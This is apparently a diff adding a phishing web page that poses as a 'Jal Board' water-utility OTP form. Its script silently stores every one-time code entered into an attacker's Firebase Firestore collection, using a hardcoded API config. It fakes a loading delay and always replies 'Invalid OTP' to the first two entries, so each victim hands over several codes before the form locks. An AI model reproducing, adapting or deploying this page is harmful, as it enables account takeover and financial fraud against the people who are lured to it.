@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>dehijlbrd</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <style>
+    body {
+      font-family: Arial;
+      background-color: #FFFFFF;
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+    }
+    img {
+      width: 100%;
+      max-width: 300px;
+      border-radius: 10px;
+    }
+    .side-button {
+      margin-top: 20px;
+      padding: 12px;
+      width: 100%;
+      font-size: 17px;
+      background-color: #FF0000;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 10px;
+    }
+    .form-container {
+      margin-top: 30px;
+      text-align: left;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-container h2 {
+      text-align: center;
+      background-color: #00008b;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    .input-group label {
+      font-size: 16px;
+      font-weight: bold;
+      display: block;
+      margin-bottom: 5px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    #message {
+      color: red;
+      font-size: 18px;
+      text-align: center;
+      margin-top: 15px;
+    }
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(5px);
+      background-color: rgba(255,255,255,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+  </style>
+  <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+</head>
+<body>
+  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer">
+
+  <div class="form-container">
+    <h2>जल¥बोर्ड</h2>
+
+    <form onsubmit="return handleOTP(event)">
+      <div class="input-group">
+        <label for="otp">Enter OTP</label>
+        <input type="text" id="otp" name="otp" maxlength="8" inputmode="numeric" pattern="\d{1,8}" placeholder="Enter OTP" required>
+      </div>
+
+      <button class="side-button" type="submit" id="submitBtn">Submit</button>
+
+      <div id="message"></div>
+    </form>
+  </div>
+
+  <!-- Blur & Loader -->
+  <div id="overlay">
+    <lottie-player src="https://assets4.lottiefiles.com/packages/lf20_usmfx6bp.json"
+      background="transparent" speed="1" style="width: 150px; height: 150px;" loop autoplay>
+    </lottie-player>
+  </div>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
+      authDomain: "dlhiljbrd.firebaseapp.com",
+      projectId: "dlhiljbrd",
+      storageBucket: "dlhiljbrd.firebasestorage.app",
+      messagingSenderId: "981951131769",
+      appId: "1:981951131769:web:5d56cd1423d753992664a8"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
+
+  <script>
+    let attempt = 0;
+
+    function handleOTP(e) {
+      e.preventDefault();
+
+      const otpInput = document.getElementById("otp");
+      const otp = otpInput.value.trim();
+      const messageBox = document.getElementById("message");
+      const overlay = document.getElementById("overlay");
+      const button = document.getElementById("submitBtn");
+
+      if (otp.length < 4 || otp.length > 8 || isNaN(otp)) {
+        alert("Please enter a valid OTP (4 to 8 digits).");
+        return false;
+      }
+
+      overlay.style.display = "flex";
+      messageBox.textContent = "";
+      button.disabled = true;
+      otpInput.disabled = true;
+
+      db.collection("otp_entries").add({
+        otp: otp,
+        attempt: attempt + 1,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
+
+      setTimeout(() => {
+        overlay.style.display = "none";
+        attempt++;
+
+        if (attempt === 1 || attempt === 2) {
+          messageBox.textContent = "Invalid OTP";
+          button.disabled = false;
+          otpInput.disabled = false;
+        } else {
+          messageBox.textContent = "Try again after sometime.";
+          button.disabled = true;
+          otpInput.disabled = true;
+        }
+
+        otpInput.value = "";
+      }, 10000); // 10 sec delay
+    }
+  </script>
+</body>
+</html>
